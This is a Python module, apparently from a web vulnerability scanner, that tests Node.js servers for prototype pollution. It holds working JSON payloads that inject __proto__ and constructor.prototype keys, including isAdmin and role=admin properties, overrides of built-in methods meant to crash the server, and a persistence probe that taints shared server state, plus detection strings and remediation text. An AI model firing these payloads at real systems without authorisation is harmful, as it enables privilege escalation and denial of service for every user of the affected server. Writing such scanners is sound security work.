"""
Prototype Pollution Tester Module for Deep Eye.

Tests for JavaScript prototype pollution via JSON body injection of __proto__
and constructor.prototype payloads.
"""

import json
from typing import Dict, List, Optional
from urllib.parse import urlparse

from utils.logger import get_logger

logger = get_logger(__name__)


class PrototypePollutionTester:
    """Tests for server-side and client-side prototype pollution vulnerabilities."""

    POLLUTION_PAYLOADS = [
        # Direct __proto__ pollution
        {"__proto__": {"polluted": "true"}},
        {"__proto__": {"isAdmin": True}},
        {"__proto__": {"role": "admin"}},
        {"__proto__": {"status": 1}},
        # Constructor prototype pollution
        {"constructor": {"prototype": {"polluted": "true"}}},
        {"constructor": {"prototype": {"isAdmin": True}}},
        # Nested pollution attempts
        {"a": {"__proto__": {"polluted": "true"}}},
        {"a": {"constructor": {"prototype": {"polluted": "true"}}}},
        # Alternative property access
        {"__proto__[polluted]": "true"},
        {"__proto__.polluted": "true"},
        {"constructor.prototype.polluted": "true"},
    ]

    # Payloads that may trigger observable errors
    ERROR_PAYLOADS = [
        {"__proto__": {"toString": "polluted"}},
        {"__proto__": {"valueOf": "polluted"}},
        {"__proto__": {"hasOwnProperty": "polluted"}},
        {"constructor": {"prototype": {"toString": None}}},
    ]

    ERROR_INDICATORS = [
        "cannot read propert",
        "is not a function",
        "typeerror",
        "prototype",
        "object.prototype",
        "__proto__",
        "polluted",
        "cannot convert",
        "unexpected token",
        "internal server error",
    ]

    def __init__(self, http_client, config: Dict):
        self.http_client = http_client
        self.config = config
        self.timeout = config.get("scanner", {}).get("timeout", 10)

    def scan(self, url: str, context: Optional[Dict] = None) -> List[Dict]:
        """
        Scan a URL for prototype pollution vulnerabilities.

        Args:
            url: Target URL to test.
            context: Optional context dictionary.

        Returns:
            List of vulnerability dictionaries.
        """
        vulnerabilities = []
        context = context or {}

        logger.info(f"[ProtoPollution] Testing: {url}")

        # Get baseline response
        baseline = self._get_baseline(url)

        # Test JSON body prototype pollution via POST
        vulns = self._test_json_post(url, baseline)
        vulnerabilities.extend(vulns)

        # Test JSON body prototype pollution via PUT
        vulns = self._test_json_put(url, baseline)
        vulnerabilities.extend(vulns)

        # Test error-inducing payloads
        vulns = self._test_error_payloads(url, baseline)
        vulnerabilities.extend(vulns)

        # Test pollution persistence (send pollution, then check GET)
        vulns = self._test_pollution_persistence(url)
        vulnerabilities.extend(vulns)

        logger.info(f"[ProtoPollution] Found {len(vulnerabilities)} potential issues on {url}")
        return vulnerabilities

    def _get_baseline(self, url: str) -> Optional[Dict]:
        """Get baseline response for comparison."""
        try:
            response = self.http_client.post(
                url,
                json={"test": "baseline"},
                timeout=self.timeout,
            )
            if response is None:
                return None
            return {
                "status_code": response.status_code,
                "content_length": len(response.text),
                "text": response.text,
                "headers": dict(response.headers),
            }
        except Exception as e:
            logger.debug(f"[ProtoPollution] Baseline error: {e}")
            return None

    def _test_json_post(self, url: str, baseline: Optional[Dict]) -> List[Dict]:
        """Test prototype pollution via POST with JSON content-type."""
        vulnerabilities = []

        for payload in self.POLLUTION_PAYLOADS:
            try:
                response = self.http_client.post(
                    url,
                    json=payload,
                    timeout=self.timeout,
                )
                if response is None:
                    continue

                evidence = self._analyze_response(response, baseline, payload)
                if evidence:
                    vulnerabilities.append({
                        "type": "prototype_pollution",
                        "severity": "high",
                        "url": url,
                        "parameter": "JSON body (POST)",
                        "payload": json.dumps(payload),
                        "evidence": evidence,
                        "description": (
                            "Server-side prototype pollution detected. The application processes "
                            "__proto__ or constructor.prototype properties from JSON input, allowing "
                            "an attacker to inject properties into Object.prototype. This can lead to "
                            "denial of service, property injection, or remote code execution."
                        ),
                        "remediation": (
                            "Sanitize JSON input by stripping __proto__ and constructor keys before "
                            "processing. Use Object.create(null) for dictionary objects. Freeze "
                            "Object.prototype. Use Map instead of plain objects for user-controlled data. "
                            "Implement schema validation that rejects __proto__ and constructor fields."
                        ),
                    })
                    return vulnerabilities  # One finding per method is enough

            except Exception as e:
                logger.debug(f"[ProtoPollution] POST test error: {e}")

        return vulnerabilities

    def _test_json_put(self, url: str, baseline: Optional[Dict]) -> List[Dict]:
        """Test prototype pollution via PUT with JSON content-type."""
        vulnerabilities = []

        # Test a subset of payloads via PUT
        for payload in self.POLLUTION_PAYLOADS[:5]:
            try:
                response = self.http_client.post(
                    url,
                    json=payload,
                    headers={"X-HTTP-Method-Override": "PUT"},
                    timeout=self.timeout,
                )
                if response is None:
                    continue

                evidence = self._analyze_response(response, baseline, payload)
                if evidence:
                    vulnerabilities.append({
                        "type": "prototype_pollution",
                        "severity": "high",
                        "url": url,
                        "parameter": "JSON body (PUT)",
                        "payload": json.dumps(payload),
                        "evidence": evidence,
                        "description": (
                            "Server-side prototype pollution via PUT request. The application "
                            "unsafely merges JSON input containing __proto__ or constructor properties."
                        ),
                        "remediation": (
                            "Strip dangerous keys (__proto__, constructor, prototype) from all "
                            "incoming JSON before object merging or assignment. Use safe merge "
                            "libraries that skip prototype properties."
                        ),
                    })
                    return vulnerabilities

            except Exception as e:
                logger.debug(f"[ProtoPollution] PUT test error: {e}")

        return vulnerabilities

    def _test_error_payloads(self, url: str, baseline: Optional[Dict]) -> List[Dict]:
        """Test payloads designed to corrupt built-in methods and trigger errors."""
        vulnerabilities = []

        for payload in self.ERROR_PAYLOADS:
            try:
                response = self.http_client.post(
                    url,
                    json=payload,
                    timeout=self.timeout,
                )
                if response is None:
                    continue

                # These payloads should cause 500 errors if pollution works
                if response.status_code == 500:
                    response_lower = response.text.lower()
                    for indicator in self.ERROR_INDICATORS:
                        if indicator in response_lower:
                            vulnerabilities.append({
                                "type": "prototype_pollution",
                                "severity": "critical",
                                "url": url,
                                "parameter": "JSON body (built-in override)",
                                "payload": json.dumps(payload),
                                "evidence": (
                                    f"Server crashed (500) after prototype pollution of built-in method. "
                                    f"Error indicator: '{indicator}'. This confirms the prototype chain "
                                    f"was modified server-side."
                                ),
                                "description": (
                                    "Critical prototype pollution confirmed. Overwriting built-in "
                                    "Object.prototype methods (toString, valueOf) caused a server error, "
                                    "proving the application is vulnerable to prototype chain manipulation. "
                                    "This can lead to RCE in some Node.js frameworks."
                                ),
                                "remediation": (
                                    "Immediately patch: sanitize all JSON input, reject __proto__ and "
                                    "constructor keys at the framework level. Use --frozen-intrinsics "
                                    "Node.js flag. Upgrade vulnerable merge/clone libraries (lodash, "
                                    "jQuery.extend, etc.)."
                                ),
                            })
                            return vulnerabilities

            except Exception as e:
                logger.debug(f"[ProtoPollution] Error payload test: {e}")

        return vulnerabilities

    def _test_pollution_persistence(self, url: str) -> List[Dict]:
        """Test if pollution persists across requests (affects other users)."""
        vulnerabilities = []

        # Step 1: Send pollution payload
        pollution_payload = {"__proto__": {"deep_eye_canary": "polluted_12345"}}
        try:
            self.http_client.post(url, json=pollution_payload, timeout=self.timeout)
        except Exception:
            return vulnerabilities

        # Step 2: Send clean request and check if canary appears
        try:
            response = self.http_client.post(
                url,
                json={"check": "clean"},
                timeout=self.timeout,
            )
            if response is None:
                return vulnerabilities

            if "polluted_12345" in response.text or "deep_eye_canary" in response.text:
                vulnerabilities.append({
                    "type": "prototype_pollution",
                    "severity": "critical",
                    "url": url,
                    "parameter": "JSON body (persistent pollution)",
                    "payload": json.dumps(pollution_payload),
                    "evidence": (
                        "Prototype pollution persists across requests. Canary value "
                        "'polluted_12345' appeared in subsequent clean request response. "
                        "This affects all users sharing the same server process."
                    ),
                    "description": (
                        "Persistent prototype pollution confirmed. Injected properties survive "
                        "across HTTP requests, meaning a single attacker request can affect all "
                        "subsequent users. This is a critical vulnerability that can lead to "
                        "mass privilege escalation or denial of service."
                    ),
                    "remediation": (
                        "This is a critical issue requiring immediate action. Sanitize all JSON "
                        "input at the framework level. Restart affected services. Implement "
                        "Object.freeze(Object.prototype) as a defense-in-depth measure. "
                        "Audit all object merge/clone operations."
                    ),
                })

            # Also check via GET
            response = self.http_client.get(url, timeout=self.timeout)
            if response and "polluted_12345" in response.text:
                if not vulnerabilities:  # Avoid duplicate
                    vulnerabilities.append({
                        "type": "prototype_pollution",
                        "severity": "critical",
                        "url": url,
                        "parameter": "JSON body (persistent, visible in GET)",
                        "payload": json.dumps(pollution_payload),
                        "evidence": (
                            "Polluted property visible in GET response after POST injection. "
                            "Confirms server-wide prototype chain corruption."
                        ),
                        "description": (
                            "Persistent prototype pollution visible across request methods. "
                            "The polluted prototype affects GET responses, confirming global impact."
                        ),
                        "remediation": (
                            "Immediately restart the service and deploy input sanitization. "
                            "Strip __proto__ and constructor from all incoming JSON payloads."
                        ),
                    })

        except Exception as e:
            logger.debug(f"[ProtoPollution] Persistence test error: {e}")

        return vulnerabilities

    def _analyze_response(
        self, response, baseline: Optional[Dict], payload: Dict
    ) -> Optional[str]:
        """Analyze response for prototype pollution indicators."""
        indicators = []
        response_lower = response.text.lower()

        # Check for error indicators suggesting prototype manipulation
        for indicator in self.ERROR_INDICATORS:
            if indicator in response_lower:
                indicators.append(f"Error indicator: '{indicator}'")

        # Check for 500 error (baseline was not 500)
        if response.status_code == 500:
            if baseline is None or baseline["status_code"] != 500:
                indicators.append("Server error (500) triggered by prototype payload")

        # Check if polluted values appear in response
        payload_str = json.dumps(payload)
        if "polluted" in response_lower and "polluted" not in (baseline or {}).get("text", "").lower():
            indicators.append("Pollution canary value reflected in response")

        # Check for significant response change
        if baseline:
            current_length = len(response.text)
            baseline_length = baseline["content_length"]
            if baseline_length > 0:
                diff = abs(current_length - baseline_length) / baseline_length
                if diff > 0.5:
                    indicators.append(
                        f"Response size changed significantly: {baseline_length} -> {current_length}"
                    )

        if indicators:
            return "; ".join(indicators)
        return None
